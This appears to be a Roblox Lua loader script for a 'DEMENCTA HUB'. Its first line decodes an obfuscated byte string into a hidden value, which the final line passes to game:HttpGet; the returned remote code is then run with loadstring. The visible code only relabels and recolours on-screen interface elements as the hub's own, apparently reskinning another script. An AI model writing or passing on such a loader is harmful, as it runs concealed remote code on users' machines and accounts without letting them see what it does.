
--[[ STAGE 2: VISUAL CORE ]]
local nxLxpHkaYaQV_qB7oICh="\215\231\235\235\242\189\182\186\001\244\014\201\006\012\027\019\036\021\044\046\036\053\042\058\061\071\060\073\083\017\074\090\092\034\101\106\109\100\116\112\124\116\133\142\131\082\137\157\152\150\162\178\160\175\179\122\188\180\192\201\142\182\219\204\209\223\220\218\209\236\253\236\251\006\246\200\254\246\028\024\028\028\043\026\007\056\041\042\069\004\005\013\013\027\070\062\094\104\105\094\100\098\063\113\113\072\071\127\082\085\085\151\164\148"local JXUIAOHKZojCY=128 local nvtsWbm_tPU3CNgo=216 local r7sSwCScu85koXRL8=0 local n_feC7FfvSkfpFVzDObil=4 local eGgsymPdTW6QBPdR=19 local WAEZBxduNoql=false local twuY3lg4MPa03L1zZQ=bit32 and bit32.bxor if not twuY3lg4MPa03L1zZQ then twuY3lg4MPa03L1zZQ=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local SCKqrvW4VmGVJMXaGt2hx={}for q44nkaZNJisFuyM=1,#nxLxpHkaYaQV_qB7oICh do local hhtjyfB1EKD4oArN=string.byte(nxLxpHkaYaQV_qB7oICh,q44nkaZNJisFuyM)local Tci2W_JLcITTUcAznxxM=(nvtsWbm_tPU3CNgo+(q44nkaZNJisFuyM*n_feC7FfvSkfpFVzDObil)+eGgsymPdTW6QBPdR)%256 if r7sSwCScu85koXRL8==0 then hhtjyfB1EKD4oArN=(hhtjyfB1EKD4oArN-Tci2W_JLcITTUcAznxxM)%256 SCKqrvW4VmGVJMXaGt2hx[q44nkaZNJisFuyM]=string.char(twuY3lg4MPa03L1zZQ(hhtjyfB1EKD4oArN,JXUIAOHKZojCY))else hhtjyfB1EKD4oArN=twuY3lg4MPa03L1zZQ(hhtjyfB1EKD4oArN,JXUIAOHKZojCY)SCKqrvW4VmGVJMXaGt2hx[q44nkaZNJisFuyM]=string.char((hhtjyfB1EKD4oArN-Tci2W_JLcITTUcAznxxM)%256)end end local eJMSdCtSOM3hx=table.concat(SCKqrvW4VmGVJMXaGt2hx)if WAEZBxduNoql then eJMSdCtSOM3hx=string.reverse(eJMSdCtSOM3hx)end local KNYZf86ISLJgCMg0PbSJZd=eJMSdCtSOM3hx
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(KNYZf86ISLJgCMg0PbSJZd))()
